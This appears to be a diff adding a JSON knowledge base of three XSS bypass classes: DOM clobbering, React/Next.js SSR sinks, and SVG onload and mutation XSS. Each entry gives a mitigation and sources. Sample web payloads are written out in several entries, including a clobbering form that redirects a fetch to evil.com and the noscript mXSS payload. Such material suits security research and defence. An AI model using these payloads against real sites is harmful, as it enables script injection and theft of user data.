@@ -1,0 +1,120 @@
+{
+  "items": [
+    {
+      "item_key": "xss.domclobber",
+      "class_id": "xss",
+      "kind": "bypass",
+      "claim": "DOM clobbering turns benign injected HTML into XSS: an attacker injects markup whose id/name collides with a security-sensitive JS variable, and the browser's named-property behavior makes window.[name] resolve to an HTML element instead of the intended data. This is the XSS side-channel for sanitizers that block script tags but leave HTML in.",
+      "body": "(1) Vulnerable code reads a global that may be a DOM element: e.g. `const url = window.config?.apiUrl; fetch(url)`. (2) Attacker injects <form id=config><input name=apiUrl value=https://evil.com></form>; the browser now sets window.config to a form element and window.config.apiUrl returns the input value, so fetch goes to evil.com. (3) OWASP documents two canonical examples: <a id=redirectTo href='javascript:alert(1)'></a> obtains XSS from a clobbered redirectTo, and <a id=config><a id=config name=url href='malicious.js'> loads arbitrary JS via named property access. (4) DOM clobbering is the classic escape hatch when a sanitizer blocks script but leaves HTML; OWASP's DOM Clobbering Prevention Cheat Sheet states: 'attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving Cross-Site Scripting (XSS).'",
+      "disproof": "Freeze sensitive DOM objects (Object.freeze), type-check window properties before use (instanceof), sanitize id/name attributes before insertion, or declare globals with let/const so they are not window-properties.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html",
+          "source_type": "primary",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving Cross-Site Scripting (XSS).",
+          "locator": "Introduction"
+        },
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html",
+          "source_type": "primary",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "inject the markup <a id=redirectTo href='javascript:alert(1)'></a> and obtain XSS.",
+          "locator": "Example Attack 1"
+        },
+        {
+          "url": "https://www.codereviewlab.com/learning/advanced-xss",
+          "source_type": "practitioner",
+          "host": "codereviewlab.com",
+          "publisher": "CodeReviewLab",
+          "quote": "DOM Clobbering becomes XSS when the clobbered value reaches a dangerous sink. Common patterns include clobbering configuration objects, URL variables, or callback function references.",
+          "locator": "03 // DOM Clobbering"
+        }
+      ]
+    },
+    {
+      "item_key": "xss.reactssr",
+      "class_id": "xss",
+      "kind": "technique",
+      "claim": "React and Next.js SSR shift the XSS surface rather than remove it: JSX escapes string values, but server-side rendering of unescaped data plus dangerouslySetInnerHTML / url / style sinks produce XSS that client-side sanitizers cannot reach.",
+      "body": "(1) Next.js SSR renders React components, JSX or TSX to HTML using JavaScript execution; JSX is compiled to JS functions, so {{7*7}} is NOT interpreted as template code by Next.js itself. (2) By default React escapes < > & in JSX text, so classic CSTI payloads do not fire in pure Next.js CSR, but dangerouslySetInnerHTML bypasses that escaping entirely. (3) Client-side sinks (dangerouslySetInnerHTML, href with javascript: scheme, style attribute with user input, element.innerHTML via refs) are NOT protected by React's JSX escaping. (4) PortSwigger's research notes React has no built-in sanitization for dangerouslySetInnerHTML; OWASP's Next.js Security Cheat Sheet directs bug hunters to check for dangerouslySetInnerHTML, __html, innerHTML, insertAdjacentHTML and setInnerHTML, and to test with {{7*7}}, {{this}} and {{constructor.constructor('alert(1)')()}}.",
+      "disproof": "Never use dangerouslySetInnerHTML without sanitizing; scheme-allow-list URLs in href; sanitize style/CSS; use React's built-in escaping and CSP with script-src nonces.",
+      "severity_hint": "High",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide",
+          "source_type": "practitioner",
+          "host": "deepstrike.io",
+          "publisher": "DeepStrike",
+          "quote": "Next.js SSR renders React components, JSX or TSX, to HTML using JavaScript execution, not an eval style templating engine such as EJS or Handlebars.",
+          "locator": "CSTI and XSS in Next.js"
+        },
+        {
+          "url": "https://mahsamohajer.com/security",
+          "source_type": "practitioner",
+          "host": "mahsamohajer.com",
+          "publisher": "Mahsa Mohajer",
+          "quote": "dangerouslySetInnerHTML bypasses React's escaping entirely and injects raw HTML directly into the DOM.",
+          "locator": "dangerouslySetInnerHTML: When and How to Use Safely"
+        },
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Nextjs_Security_Cheat_Sheet.html",
+          "source_type": "primary",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "Always check for dangerouslySetInnerHTML usage or imported template engines when doing static analysis.",
+          "locator": "CSTI and XSS in Next.js"
+        }
+      ]
+    },
+    {
+      "item_key": "xss.svgonload-mxss",
+      "class_id": "xss",
+      "kind": "variant",
+      "claim": "SVG onload and mutation XSS (mXSS) are bypass classes that survive html-sanitizer allow-lists: SVG fires onload automatically even where <script> is filtered, and mXSS exploits the parser/serialiser round-trip so a sanitizer sees a benign tree while the browser re-parses it into a dangerous one.",
+      "body": "(1) SVG onload: <svg onload=alert(1)> fires automatically when the SVG node is rendered, and the SVG namespace expands the allowed event-handler set, so if <script> is filtered but SVG is allowed, onload breaks through. (2) mXSS: a sanitizer parses HTML, serializes it (innerHTML), and the browser re-parses; the two parsers disagree, exposing a tag the sanitizer blessed. (3) Classic noscript example: the sanitizer sees a benign title attribute inside <noscript>, but on re-parse the browser treats </noscript> as a real end tag and exposes <img onerror>. (4) DOMPurify pre-3.2.7 (and 2.5.3-2.5.8) carried this exact class - CVE-2025-15599 and CVE-2026-0540 - and the fix is to pin >= 3.2.7 / 2.5.9 and never mutate sanitizer output.",
+      "disproof": "Sanitize with DOMPurify (pin >= 3.2.7 / 2.5.9), never mutate already-sanitized output, and avoid post-sanitisation DOM transforms.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/xss",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "Works wherever <script> is filtered but SVG is not, because the SVG namespace expands the allowed handler set. Fires automatically when the SVG node is rendered.",
+          "locator": "SVG onload"
+        },
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/xss",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "Sanitised HTML is mutated by the parser/serialiser round trip into something dangerous - the sanitiser saw a benign tree, but the browser re-parse exposes a tag.",
+          "locator": "Mutation XSS (mXSS)"
+        },
+        {
+          "url": "https://www.vulnsy.com/cheat-sheets/xss",
+          "source_type": "practitioner",
+          "host": "vulnsy.com",
+          "publisher": "Vulnsy",
+          "quote": "DOMPurify 3.1.3-3.2.6 / 2.5.3-2.5.8 ... CVE-2025-15599 and CVE-2026-0540 cover this class for DOMPurify 3.1.3-3.2.6 and 2.5.3-2.5.8. Pin >= 3.2.7 / 2.5.9.",
+          "locator": "DOMPurify pre-3.2.7 mXSS class"
+        },
+        {
+          "url": "https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/",
+          "source_type": "dataset",
+          "host": "github.com",
+          "publisher": "swisskyrepo",
+          "quote": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+          "locator": "Mutated XSS"
+        }
+      ]
+    }
+  ]
+}
